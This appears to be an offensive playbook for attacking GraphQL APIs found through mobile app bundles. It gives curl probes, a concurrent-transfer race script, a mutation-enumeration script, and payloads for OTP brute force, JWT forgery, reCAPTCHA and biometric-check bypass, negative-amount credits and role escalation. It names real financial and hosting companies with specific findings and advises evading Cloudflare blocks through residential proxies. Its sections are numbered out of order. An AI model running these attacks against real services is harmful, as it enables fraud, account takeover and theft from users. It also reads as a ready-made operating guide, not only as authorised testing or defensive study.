# GraphQL API Attack Patterns

Systematic methodology for attacking GraphQL APIs discovered via mobile app bundle analysis or direct introspection.

## 1. Recon: Extract Operations from Bundle

When introspection is disabled (common in production), the mobile app bundle IS the schema.

```bash
# Extract all mutation/operation names (numbered or named)
grep -oE 'mutation [A-Z][a-zA-Z0-9]+' all_strings.txt | sort -u
grep -oE '[A-Z][a-zA-Z0-9]+Mutation' all_strings.txt | sort -u

# Extract variable names (input fields for mutations)
grep -oE '\$[a-zA-Z]+' all_strings.txt | sort -u

# Count by category
grep -c 'mutation' all_strings.txt  # Total mutations
grep -c 'query' all_strings.txt     # Total queries
```

**Bundle format note:** React Native/Hermes bundles encode GraphQL operations as numbered strings (e.g., `"mutation_4051709039"` or `"SubmitTransferMutation"`). Both forms map to actual server-side operations.

## 2. Identify Unauthenticated Namespaces

GraphQL APIs often expose unauthenticated mutation namespaces for pre-login flows. These are the HIGHEST VALUE targets because they bypass session auth entirely.

### Detection Pattern
```bash
# Search for unauthenticated namespace indicators
grep -i 'unauthenticated.*namespace\|unauthenticated.*mutation\|public.*namespace' all_strings.txt

# Search for unauthenticated operation names
grep -ioE 'Unauthenticated[A-Z][a-zA-Z]+' all_strings.txt | sort -u

# Common unauthenticated operations:
# - Step-up MFA creation/verification
# - OTP initialization/authentication
# - Account recovery
# - Password reset
# - 3DS challenge
```

### Attack Surface
```
UnauthenticatedCreateStepUp          → Creates MFA challenge (no auth needed)
UnauthenticatedInitializeOtp         → Sends OTP (no auth needed)
UnauthenticatedAuthenticateOtp       → Verifies OTP (no auth needed)
UnauthenticatedAuthenticate3ds       → 3DS verification (no auth needed)
UnauthenticatedStepUpStatusQuery     → Checks step-up status (no auth needed)
UnauthenticatedCancelStepUp          → Cancels step-up (no auth needed)
UnauthenticatedInitializeScanId      → ID verification session (no auth needed)
```

### Exploitation
1. **OTP Brute Force:** Create step-up → Initialize OTP → Brute force 6-digit codes
   - Rate limiting may or may not exist on unauthenticated namespace
   - 6 digits = 1M combinations, but lockout typically at 3-10 attempts
   - Test with small range first (000000-000010) to detect lockout behavior

2. **Step-Up ID Enumeration:** Sequential/guessable IDs → monitor other users' MFA status
   - Test: create step-up, note ID, try sequential IDs in status query

3. **3DS JWT Forgery:** Submit forged `post_challenge_jwt` to bypass 3DS
   - If server validates JWT signature client-side only → bypass possible
   - Test with: empty string, malformed JWT, {"alg":"none"} JWT

## 3. BOLA/IDOR via Mutation Variables

GraphQL mutations that accept user IDs, card IDs, or account IDs as variables are BOLA candidates.

### Detection Pattern
```bash
# Find mutations accepting ID parameters
grep -oE '\$[a-zA-Z_]*(id|Id|ID)[a-zA-Z_]*' all_strings.txt | sort -u

# Find input types with ID fields
grep -oE 'input [A-Za-z]+Input' all_strings.txt | sort -u
```

### High-Value BOLA Targets
| Mutation Pattern | Variable to Test | Impact |
|-----------------|-----------------|--------|
| `SubmitTransfer` | `recipient_id` | Unauthorized fund transfer |
| `SubmitWireTransfer` | `recipient_id` | Wire fraud |
| `ActivateCard` | `card_id` | Activate another user's card |
| `SubmitLoanApplication` | `applicant_id` | Loan application manipulation |
| `UpdateProfile` | `user_id` | Profile modification |
| `SubmitAccountFunding` | `external_card_id` | Fund from arbitrary card |

### Testing Methodology
1. Create two test accounts (Account A, Account B)
2. Perform action from Account A with Account B's ID
3. If action succeeds on Account B's resource → BOLA confirmed
4. Test with: non-existent IDs, negative IDs, UUIDs, special characters

## 4. Race Conditions from Static Analysis

### Detection Pattern
Mutations that perform financial operations WITHOUT client-side idempotency keys are race condition candidates.

```bash
# Find money movement mutations
grep -ioE '(transfer|payment|wire|funding|withdrawal|deposit)[a-zA-Z]*Mutation' all_strings.txt | sort -u

# Check for idempotency key patterns
grep -i 'idempoten\|idempotency\|dedup\|deduplic\|request_id\|idempotency_key' all_strings.txt
```

### Red Flags (Race Condition Indicators)
- Mutation has NO `idempotency_key` or `request_id` variable
- Mutation performs: balance check THEN transfer (TOCTOU pattern)
- Multiple concurrent requests to same mutation = potential double-spend
- Mutation name contains: Transfer, Payment, Funding, Withdrawal, Purchase

### Exploitation
```python
import asyncio, aiohttp

async def race_transfer(session, mutation, variables, n=10):
    """Fire N concurrent transfer requests"""
    tasks = [session.post(API_URL, json={
        "operationName": mutation,
        "variables": variables,
        "query": QUERY
    }) for _ in range(n)]
    
    responses = await asyncio.gather(*tasks)
    successes = sum(1 for r in responses if r.status == 200)
    print(f"Concurrent: {n}, Successes: {successes}")
    # If successes > 1 → race condition exploitable
```

### Known Vulnerable Patterns
- Transfer mutations with only `recipient_id` and `amount` (no idempotency)
- Payment mutations with `source_account_id` but no `request_id`
- Wire transfer mutations (typically high-value, less protection)
- Loan repayment mutations (financial operations, often overlooked)

## 5. Step-Up MFA Analysis

Step-up authentication (additional verification for sensitive operations) is a critical attack surface.

### Architecture Pattern
```
1. User initiates sensitive action (transfer, profile change)
2. Server returns StepUpRequired error
3. Client creates step-up challenge (CreateStepUp mutation)
4. User completes challenge (OTP, 3DS, ID verification)
5. Client submits verification (AuthenticateOtp, Authenticate3ds)
6. Server returns session_token for the step-up
7. Client retries original action with step-up session_token
```

### Attack Points
1. **Step-up creation** — Can attacker create step-ups for other users?
2. **Challenge bypass** — Can attacker skip the challenge step?
3. **Token forgery** — Can attacker forge the verification JWT/token?
4. **Session reuse** — Can a step-up token be reused for different actions?

### Testing
```bash
# Test step-up creation without auth
curl -X POST https://API/graphql \
  -H "Content-Type: application/json" \
  -d '{"operationName":"UnauthenticatedCreateStepUp","query":"mutation { step_up { create_step_up(input:{challenge_context:\"email\"}) { step_up_id } } }"}'

# Test with different challenge contexts
# email, phone, sms, totp, 3ds, scan_id, security_question
```

## 6. GraphQL-Specific Error Analysis

GraphQL errors often leak more information than REST errors.

### Error Types to Watch For
| Error Pattern | Meaning | Attack Value |
|--------------|---------|--------------|
| `"You are not authorized"` | Auth check exists but bypassable | Try different auth methods |
| `"StepUpRequired"` | Step-up MFA triggered | Attack step-up flow |
| `"Rate limit exceeded"` | Rate limiting exists | Document threshold, pivot |
| `"Invalid input"` | Input validation exists | Try malformed inputs |
| `"Internal server error"` | Server-side exception | Potential injection point |
| `"Field not found"` | Schema introspection partial | Enumerate fields |

### Information Leakage
- Error messages that include user IDs → account enumeration
- Error messages that include internal paths → infrastructure disclosure
- Different errors for "user not found" vs "wrong password" → username enumeration

## 7. QA/Staging Environment Testing

Mobile apps often include URLs for QA, dev, staging, and integration environments.

### Environment Discovery
```bash
# Find all environment-specific URLs
grep -oE 'https?://[a-zA-Z0-9.-]*(dev[0-9]+|qa|staging|integ|preprod)[a-zA-Z0-9.-]*' all_strings.txt | sort -u
```

### Testing Priority
1. **QA environments** — Often have weaker auth, debug features enabled
2. **Dev environments** — May have test accounts, debug endpoints
3. **Integration environments** — May have mock services, no rate limiting
4. **Preprod environments** — Closest to production, most realistic findings

### What to Test on QA/Dev
- GraphQL introspection (often enabled on non-prod)
- Introspection depth limit (often unlimited on QA)
- Rate limiting (often disabled or relaxed)
- Authentication requirements (may have backdoor accounts)
- Debug endpoints (may expose internal tools)

## 8. Cloudflare WAF Bypass Strategy

When Cloudflare blocks ALL API requests from VPS IPs:

### Error 1009 ("edge restrict")
- IP-based blocking at Cloudflare edge
- **NOT bypassable** with User-Agent rotation, header manipulation, or HTTP/2
- **Solution:** US residential proxy (primary) or browser automation from US IP

### Pivot Strategy (When No US Proxy Available)
1. **Static analysis** — Bundle string extraction, source code review
2. **Third-party services** — Zendesk, Sentry, analytics, CDN endpoints
3. **Infrastructure recon** — S3, pre-prod, dev environments
4. **Mobile app analysis** — APK/IPA decompilation, deep link testing
5. **Help center enumeration** — Zendesk API (often unauthenticated)
6. **WebSocket testing** — May bypass WAF if not in blocklist

### When to Stop Fighting WAF
- 3+ consecutive 403/1009 errors = WAF is blocking you
- Different User-Agent doesn't help = IP-based block
- HTTP/2 doesn't help = edge-level block
- **STOP wasting time.** Pivot to static analysis and alternative vectors.

## 9. Report Writing for GraphQL Findings

### Title Format
```
[GraphQL] BOLA in [MutationName] allows [impact] via [variable]
[GraphQL] Race condition in [MutationName] enables [impact]
[GraphQL] Unauthenticated [Operation] allows [impact]
```

### CVSS Scoring for GraphQL
- BOLA with financial impact → 8.8 (High)
- Race condition with double-spend → 8.6 (High)
- Unauthenticated OTP brute force → 7.5 (High)
- 3DS JWT forgery → 9.1 (Critical)
- Schema disclosure (introspection) → 5.3 (Medium)

### Evidence Requirements
1. Full GraphQL request (operationName, variables, query)
2. Full response (including all error fields)
3. Before/after state (balance, account status)
4. Reproduction steps (numbered, exact curl commands)
5. Impact demonstration (not just "it works" but "it causes X damage")

## 15. Error-Based Mutation Enumeration (Introspection Disabled)

When introspection is disabled but GraphQL mutations exist, error messages from failed mutation executions reveal the COMPLETE API surface: mutation names, argument names, types, and enum values.

### Technique
```bash
# Step 1: Probe candidate mutation names — server reveals full signature in error
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { Login(email:\"test@test.com\", password:\"wrong\") { token } }"}'

# Response reveals:
# - Argument names: email, password
# - Return fields: token
# - Server-side execution occurred (returned permission error, not "unknown mutation")

# Step 2: Enumerate argument details by sending wrong types/missing fields
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { Login(email:\"test@test.com\", password:\"wrong\", recaptchaToken:\"null\", unknownField:\"test\") { token } }"}'

# Response reveals:
# - Extra fields accepted without error → mass assignment potential
# - Enum values leaked: e.g., "InstallMode" with values { clone, plain, new }
# - Permission check details: "Something went wrong or you don't have the needed permission"
# - Database type leaked: e.g., r.table("User").get("") → RethinkDB
```

### Why It Works
- GraphQL executes mutations server-side BEFORE checking permissions
- Error messages are more detailed than "mutation not found" — they reveal the full parameter list
- Server returns different errors for: unknown mutation vs wrong args vs permission denied vs validation failure
- Each error type leaks different information about the backend

### What Error Messages Reveal
| Error Message | Leaked Information |
|--------------|-------------------|
| `"Unknown argument 'X'"` | Server accepted other args, rejected this one |
| `"Field 'X' is not defined"` | Return type fields, possible queries |
| `"Expected type Y, found Z"` | Argument type (String, Int, Boolean, Enum) |
| `"Invalid value for enum 'X'"` | Enum name + valid values from error |
| `"Permission denied"` | Mutation executed → auth check exists but is post-execution |
| `"Something went wrong"` | Server-side error → mutation reached business logic |
| `"r.table(...).get(...)"` | Database type (RethinkDB, MongoDB, etc.) |

### Bulk Enumeration Script
```python
import requests, json

TARGET = "https://mydev.example.com/graphql"
mutations = [
    "Login", "Register", "RegisterViaInvitation", "addSite",
    "cancelPlan", "deleteDomain", "deleteLiveSite", "addSshKey",
    "updateEmail", "removeUser", "renameSite", "enable2FA",
    "sendQuestionAbout", "removeLxdIssue", "attachPaymentMethod",
    "updateUserInfo", "EditSiteCapabilities"
]

for mutation in mutations:
    payload = {"query": f'mutation {{ {mutation}(test:\"probe\") {{ id }} }}'}
    r = requests.post(TARGET, json=payload)
    data = r.json()
    errors = data.get("extensions", {}).get("debugMessage", "")
    print(f"[{mutation}] {r.status_code} → {errors[:120]}")
```

### Real-World Example (Kinsta, 2026-09)
- `mydev.kinsta.com/graphql` — 17 mutations accessible without auth
- Each mutation executed server-side, failed only on permission checks
- `recaptchaToken: "null"` bypassed CAPTCHA on Login mutation
- Error messages leaked RethinkDB table structure: `r.table("User").get("")`
- `addSite(idCompany: "anystring")` — company validation is client-side only
- Region validation completely server-side: ALL regions accepted until auth check

### Reporting
- **Severity:** MEDIUM (5.3) — Unauthenticated mutation execution with permission check
- **Escalation:** HIGH (7.5) if any mutation lacks permission check or leaks PII
- **Title:** `[GraphQL] Unauthenticated mutation execution on [endpoint] exposes API surface`

---

## 16. reCAPTCHA Null-Token Bypass on GraphQL Mutations

GraphQL login/register mutations that include reCAPTCHA validation may be bypassable by sending a null string instead of omitting the field entirely.

### Vulnerable Pattern
```graphql
mutation Login($email: String!, $password: String!, $recaptchaToken: String!) {
  login(email: $email, password: $password, recaptchaToken: $recaptchaToken) {
    token
    user { id email }
  }
}
```

### Bypass
```json
{
  "query": "mutation { login(email:\"user@test.com\", password:\"wrong\", recaptchaToken:\"null\") { token } }"
}
```

**Key:** Send `"null"` as a string literal (not JSON null) — the server may skip CAPTCHA validation when the token is literally the string "null" or when the field is present with a falsy value.

### Testing Steps
1. Find login/register mutation that accepts `recaptchaToken` parameter
2. Test: omit field entirely → may get "required field" error
3. Test: send `"null"` string → CAPTCHA may be skipped server-side
4. Test: send empty string `""` → may bypass null-check
5. Test: send invalid but syntactically valid token → may bypass weak validation
6. If any bypass works → brute-force passwords or test account enumeration

### Impact
- **Brute-force login** without CAPTCHA limitation
- **Account enumeration** via password reset without CAPTCHA
- **Automated registration** without CAPTCHA limitation

### Severity
- **MEDIUM (5.3)** — Enables brute-force/enumeration but still requires valid credentials
- **HIGH (7.5)** if combined with weak password policy

---

## Case Studies

### Chime Financial (2026-09)
- **985 GraphQL operations** extracted from Hermes bytecode bundle
- **80+ mutations** accepting user/card/account IDs (BOLA candidates)
- **7 money movement mutations** without idempotency keys (race conditions)
- **18 unauthenticated mutations** in dedicated namespace (OTP brute force)
- **6 QA/dev environments** in production bundle (weaker auth targets)
- **Cloudflare 1009** blocked all VPS requests → pivoted to static analysis
- **FaceAuth bypass** via client-controlled `$faceMatched: Boolean!` parameter
- **dev_message info disclosure** in `GenericErrorFragment` across 260+ operations
- **Negative amount injection** via `$amount: Float!` vs `$amount: CurrencyAmountInput!` inconsistency

### Key Lesson
When Cloudflare blocks ALL dynamic testing, the mobile app bundle becomes the primary attack surface. Static analysis of 22,275 strings revealed more attack vectors than 30 minutes of active scanning would have.

---

## 10. Biometric Authentication Bypass via Client-Controlled Boolean

When GraphQL mutations accept biometric verification results as client-controlled parameters, the server trusts the client's claim instead of performing server-side verification.

### Detection Pattern
```bash
# Find biometric/face/auth boolean parameters
grep -oE '\$[a-zA-Z]*(match|Match|verified|Verified|passed|Passed|success|Success|face|Face)[a-zA-Z]*:\s*Boolean' all_strings.txt

# Find face/fingerprint/biometric related mutations
grep -ioE 'Unauthenticated.*Face.*Auth\|AuthenticateFace\|biometric\|faceMatched\|fingerprint' all_strings.txt | sort -u
```

### Vulnerable Pattern
```graphql
mutation UnauthenticatedAuthenticateFaceAuth(
  $stepUpId: ID!
  $faceMatched: Boolean!     # ← ATTACKER CONTROLS THIS
  $sessionStatus: StepUpFaceAuthSessionStatus!
  $identityToken: String
  $interviewToken: String
  $transactionId: ID
) {
  unauthenticated {
    step_up {
      authenticate_face_auth(input: {
        id: $stepUpId
        face_matched: $faceMatched    # Server trusts this value!
      }) {
        challenge_context
        step_up_status
      }
    }
  }
}
```

### Why It Works
- `$faceMatched: Boolean!` is a **client-controlled parameter** — the app sends `true` after local face scan
- If server doesn't independently verify with biometric vendor (Incode, etc.), attacker sets `faceMatched: true`
- Complete biometric MFA bypass — no face scan needed

### Exploitation
1. Initiate any step-up challenge requiring face auth
2. Intercept the `UnauthenticatedAuthenticateFaceAuth` mutation
3. Change `faceMatched` from `false` to `true` (or vice versa)
4. If server accepts → biometric bypass confirmed
5. Chain with StepUp ID enumeration (Section 2) for account takeover

### Red Flags
- `Boolean!` parameter for biometric result (should be server-verified token, not client boolean)
- No `identityToken`/`interviewToken` required (optional params = weaker verification)
- Unauthenticated namespace (no session required to submit biometric result)

---

## 11. dev_message Information Disclosure via GenericErrorFragment

GraphQL APIs often include developer-facing error fields in production error responses, exposing internal implementation details across hundreds of operations.

### Detection Pattern
```bash
# Find error fragment definitions
grep -oE 'fragment.*Error.*on.*Error.*\{[^}]*dev_message' all_strings.txt

# Find dev_message references
grep -oE 'dev_message\|developer_message\|debug_message\|internal_error' all_strings.txt | sort | uniq -c

# Count operations using the error fragment
grep -c 'GenericErrorFragment\|GenericError' all_strings.txt
```

### Vulnerable Pattern
```graphql
fragment GenericErrorFragment on GenericError {
  message_keys    # i18n message keys (enumerable)
  dev_message     # ← DEVELOPER MESSAGE — internal error details!
}
```

### What dev_message Exposes
- Stack traces and file paths
- Internal error codes and database query errors
- Implementation details (ORM, framework, version)
- Internal API endpoints and service names
- Sometimes: internal user IDs, request IDs, correlation IDs

### Exploitation
1. Trigger errors on mutations by sending malformed input (wrong types, missing required fields, boundary values)
2. Capture `dev_message` from EVERY error response
3. Build internal architecture map from error patterns
4. Look for: file paths → directory structure, SQL errors → DB type, timeout errors → internal services

### Impact Classification
- Stack traces / file paths → **Medium** (infrastructure disclosure)
- Internal error codes → **Low** (may not be actionable)
- SQL/DB errors → **High** (potential injection vector)
- Internal API endpoints → **Medium** (attack surface expansion)

---

## 12. Negative Amount Injection via Type Inconsistency

When GraphQL mutations inconsistently use raw `Float!` vs validated `CurrencyAmountInput!` for monetary amounts, older mutations may accept negative values.

### Detection Pattern
```bash
# Find Float! amount parameters (vulnerable)
grep -oE '\$[a-zA-Z]*[Aa]mount:\s*Float!' all_strings.txt | sort -u

# Find CurrencyAmountInput parameters (protected)
grep -oE '\$[a-zA-Z]*[Aa]mount:\s*CurrencyAmountInput' all_strings.txt | sort -u

# Compare counts — if Float! > 0, there are vulnerable mutations
```

### Vulnerable vs Protected
```graphql
# VULNERABLE — accepts negative values:
mutation MyPayRepaymentTransferMutation($amount: Float!, $request_id: ID!) {
  my_pay { repay_outstanding_balance(input: { amount: $amount, request_id: $request_id }) }
}

# PROTECTED — validates positive values:
mutation RepayLineOfCreditMutation($amount: CurrencyAmountInput!, $idempotencyKey: ID!) {
  lending { repay_line_of_credit(input: { amount: $amount, idempotencyKey: $idempotencyKey }) }
}
```

### Exploitation
```graphql
# Send negative amount → CREDIT instead of debit
mutation MyPayRepaymentTransferMutation($amount: Float!, $request_id: ID!) {
  my_pay {
    repay_outstanding_balance(input: { amount: -500.00, request_id: "valid_request_id" }) {
      # If accepted: $500 CREDITED to account instead of debited
    }
  }
}
```

### Impact
- Negative repayment = account credited instead of debited
- Negative expense split = other party owes attacker money
- Requires valid `request_id` — chain with enumeration if needed

---

## 13. Mass Assignment via Opaque GraphQL Input Types

GraphQL mutations that accept opaque input types (e.g., `UserInput!`, `LoanApplication!`) may accept extra fields beyond what the UI sends, enabling mass assignment attacks.

### Detection Pattern
```bash
# Find opaque input types (generic names = mass assignment risk)
grep -oE '\$input:\s*[A-Z][a-zA-Z]+Input[!)]' all_strings.txt | sort -u

# Find specific high-risk input types
grep -oE '(UserInput|SessionCreateInput|RegisterDeviceInput|LoanApplication)[!]?' all_strings.txt | sort -u
```

### Vulnerable Pattern
```graphql
# Generic input type — server may accept extra fields:
mutation UpdateAddress($input: UserInput!) {
  update(user: $input) {
    # What fields does UserInput accept?
    # If server doesn't whitelist: could inject email, phone, password, ssn, role, etc.
  }
}
```

### Exploitation
1. Send mutation with extra fields not present in UI:
```graphql
mutation UpdateAddress($input: UserInput!) {
  update(user: $input) {
    # Inject: { street: "123 Main", city: "NYC", email: "attacker@evil.com", role: "admin" }
  }
}
```
2. Check if extra fields are accepted (no error) and reflected in subsequent queries
3. Test with: `email`, `phone`, `password`, `ssn`, `account_status`, `role`, `permissions`

### Impact
- Profile modification beyond intended scope → **Medium-High**
- Role/permission escalation → **Critical**
- Account takeover via password/email change → **Critical**

---

## 14. SSN/PII in GraphQL Query Parameters

When sensitive data (SSN, date of birth, etc.) is passed as GraphQL query variables instead of mutation body, it may appear in server logs, CDN caches, WAF logs, and browser history.

### Detection Pattern
```bash
# Find queries accepting SSN/PII as variables
grep -oE '\$ssn:\s*String' all_strings.txt
grep -oE '\$ssn:\s*String' all_strings.txt
grep -oE '\$date_of_birth\|\$dob\|\$birth' all_strings.txt | sort -u

# Find queries (not mutations) with PII params
grep -B2 -A2 '\$ssn' all_strings.txt | grep 'query '
```

### Vulnerable Pattern
```graphql
query LoanKycVerifyScreenQuery($ssn: String!, $ecbsv_consented: Boolean!) {
  # SSN passed as query variable — may appear in:
  # - Server access logs
  # - CDN/edge logs (Cloudflare, CloudFront)
  # - WAF inspection logs
  # - Browser URL bar (if GET request)
  # - Proxy logs
}
```

### Impact
- SSN in logs = PII breach (regulatory: GLBA, CCPA, state privacy laws)
- Logs often retained for months → extended exposure window
- Third-party CDN/WAF providers may access logged PII
